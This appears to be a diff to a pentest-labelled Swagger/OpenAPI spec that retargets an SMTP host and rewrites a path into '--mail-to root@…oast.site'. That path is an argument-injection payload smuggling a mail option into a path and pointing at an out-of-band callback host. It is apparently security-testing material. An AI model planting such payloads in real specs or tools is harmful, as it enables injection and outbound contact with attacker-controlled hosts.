@@ -5,13 +5,13 @@
       "description": "XYZ",
       "version": "Pentest"
     },
-    "host": "life.stgairasia.com",
-    "basePath": "/",
+    "host": "life.devairasia.com",
+    "basePath": "",
     "schemes": [
       "smtp"
     ],
     "paths": {
-      "/--mail-from root@life.stgairasia.com": {
+      "/--mail-to root@c8jibi223akrnsthel90ceu1m1ayyyyyn.oast.site": {
         "get": {
           "description": "Submit Details",
           "operationId": "xyz",
